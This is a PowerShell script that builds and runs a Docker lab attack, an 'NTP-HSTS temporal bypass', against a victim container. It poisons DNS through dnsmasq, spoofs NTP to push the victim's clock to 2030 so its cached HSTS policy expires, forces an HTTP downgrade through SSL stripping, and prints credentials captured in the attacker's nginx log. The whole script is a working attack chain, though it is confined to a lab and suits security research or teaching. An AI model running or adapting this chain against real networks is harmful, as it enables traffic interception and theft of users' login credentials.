# â³ NTP-HSTS Temporal Bypass: Automated Lab Script (Final Robust)
$ErrorActionPreference = "Continue"

Write-Host "[-] Starting Lab Setup..." -ForegroundColor Cyan

# 1. Setup & Certificates
Write-Host "[-] Generating Self-Signed Certificates..." -ForegroundColor Yellow
New-Item -ItemType Directory -Force -Path ".\webserver\certs" | Out-Null
cmd /c "docker run --rm -v ""${PWD}/webserver:/work"" -w /work alpine /bin/sh -c ""apk add --no-cache openssl && mkdir -p certs && openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout certs/server.key -out certs/server.crt -subj '/C=US/ST=Test/L=Test/O=Test/CN=secure.test' 2>/dev/null"""

# 2. Build and Start
Write-Host "[-] Building and Starting Containers..." -ForegroundColor Yellow
cmd /c "docker-compose down"
cmd /c "docker-compose up -d --build"

# ---------------------------------------------------------
# PROVISIONING CHECK
# ---------------------------------------------------------
Write-Host "`n[-] Waiting for Victim Container to finish installing tools..." -ForegroundColor Yellow
$maxRetries = 20
$retryCount = 0
$provisioned = $false

while (-not $provisioned -and $retryCount -lt $maxRetries) {
    Start-Sleep -Seconds 5
    $check = docker exec victim-client which curl 2>$null
    if ($check -match "curl") {
        $provisioned = $true
        Write-Host " [OK] Tools installed!" -ForegroundColor Green
    } else {
        $retryCount++
        Write-Host " ... still installing ($retryCount/$maxRetries)" -NoNewline
    }
}

if (-not $provisioned) {
    Write-Host "`n[!] Critical Error: Victim container failed to install tools (curl). Check internet connection." -ForegroundColor Red
    exit
}

# ---------------------------------------------------------
# Phase 1: The "Safe" State (Year 2026)
# ---------------------------------------------------------
Write-Host "`n[Phase 1] Establishing HSTS Trust (Year 2026)..." -ForegroundColor Magenta
Write-Host "[-] Victim connecting to Real Server..."
# We use --resolve to force connection to Real Server (172.20.0.10) regardless of DNS
$p1 = docker exec victim-client curl -v -k --resolve secure.test:443:172.20.0.10 --hsts /hsts.txt https://secure.test/login -d "username=admin&password=SafePassword" 2>&1

if ($p1 -match "HTTP/1.1 200") {
    Write-Host "[-] Login Successful. HSTS Policy Cached." -ForegroundColor Green
} else {
    Write-Host "[!] Phase 1 Failed. Output:" -ForegroundColor Red
    Write-Host $p1
}

# ---------------------------------------------------------
# Phase 2: Setting the Trap (DNS Poisoning)
# ---------------------------------------------------------
Write-Host "`n[Phase 2] Poisoning DNS & Testing HSTS Protection..." -ForegroundColor Magenta
# Ensure DNS points to Attacker (172.20.0.5)
docker exec attacker-mitm sed -i 's/172.20.0.10/172.20.0.5/' /etc/dnsmasq.conf
docker restart attacker-mitm
Start-Sleep -Seconds 5

Write-Host "[-] Attempting Connection with Poisoned DNS (Should FAIL)..."
$p2 = docker exec victim-client curl -v -k -L --hsts /hsts.txt https://secure.test/login -d "user=admin&password=ThisShouldBeSafe" 2>&1

if ($p2 -match "Connection refused" -or $p2 -match "Failed to connect" -or $p2 -match "SSL_connect") {
    Write-Host "[-] Connection Refused! HSTS correctly blocked the attack." -ForegroundColor Green
} else {
    Write-Host "[!] Warning: Connection didn't fail as expected. Output:" -ForegroundColor Yellow
}

# ---------------------------------------------------------
# Phase 3: The Temporal Attack (Year 2030)
# ---------------------------------------------------------
Write-Host "`n[Phase 3] Launching NTP Spoofing (Shifting to 2030)..." -ForegroundColor Magenta
# Start the date-shift loop in the background
docker exec -d attacker-mitm sh -c "while true; do date -s '2030-01-01 12:00:00'; sleep 1; done"

Write-Host "[-] Waiting for Victim to Sync Time..."
for ($i=0; $i -lt 30; $i++) {
    docker exec victim-client ntpdate -u 172.20.0.5 2>$null | Out-Null
    $currentDate = docker exec victim-client date
    if ($currentDate -match "2030") {
        Write-Host "[-] Time Shift Successful: $currentDate" -ForegroundColor Green
        break
    }
    Start-Sleep -Seconds 2
}

# ---------------------------------------------------------
# Phase 4: Exploit & Compromise
# ---------------------------------------------------------
Write-Host "`n[Phase 4] Executing SSL Stripping & Credential Theft..." -ForegroundColor Magenta
Write-Host "[-] Victim connecting via HTTP (HSTS Expired)..."
# Now we connect via HTTP. HSTS is gone (expired), so this works.
$p4 = docker exec victim-client curl -v -k -L --hsts /hsts.txt http://secure.test/login -d "user=admin&password=ThisShouldBeSafe" 2>&1

if ($p4 -match "HTTP/1.1 200" -or $p4 -match "302 Found") {
     Write-Host "[-] Connection Downgraded & Successful." -ForegroundColor Green
} else {
     Write-Host "[!] Connection Warning. Output:" -ForegroundColor Yellow
     # Write-Host $p4  <-- Uncomment to debug if needed
}

Write-Host "`n[+] Checking Attacker Logs..." -ForegroundColor Cyan
$logs = docker exec attacker-mitm cat /var/log/nginx/creds.log
if ($logs) {
    Write-Host $logs -ForegroundColor Red
    Write-Host "`n[***] EXPLOIT SUCCESSFUL [***]" -ForegroundColor Cyan
} else {
    Write-Host "[!] No credentials found in log yet." -ForegroundColor Red
}

Write-Host "`n[-] Lab Complete."